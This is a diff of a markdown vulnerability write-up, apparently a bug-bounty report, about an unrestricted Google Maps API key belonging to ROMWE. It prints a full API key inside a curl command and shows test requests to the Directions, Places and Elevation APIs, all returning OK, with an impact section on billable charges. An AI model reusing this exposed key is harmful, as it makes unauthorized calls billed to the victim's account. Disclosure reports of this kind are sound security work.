@@ -35,7 +35,19 @@ I opened my terminal and fired a simple curl request, no cookies, no session, no
 ```curl "https://maps.googleapis.com/maps/api/directions/json?origin=London&destination=Manchester&key=AIzaSyANkdKFbzWu5bgALBRqmT6xpUxdl_ncBBY"```
 <img width="1920" height="1080" alt="Screenshot_(88)" src="https://github.com/user-attachments/assets/561b4dd2-0c9e-4e34-acf0-e007ceff1f61" />
 
+That ```"status": "OK" ``` told me everything. The key had no domain restrictions, no IP restrictions, and no API restrictions. It was completely open.
+I kept going:
+# Directions API
+```curl "https://maps.googleapis.com/maps/api/directions/json?origin=London&destination=Manchester&key=KEY"```
+```# status: OK ```
 
+# Places API  
+```curl "https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=london&inputtype=textquery&key=KEY"```
+```# status: OK```
+
+# Elevation API
+```curl "https://maps.googleapis.com/maps/api/elevation/json?locations=51.5,-0.1&key=KEY"```
+```# status: OK```
 
 ## Impact
 - Financial impact   — billable API calls charged to ROMWE's Google Cloud account
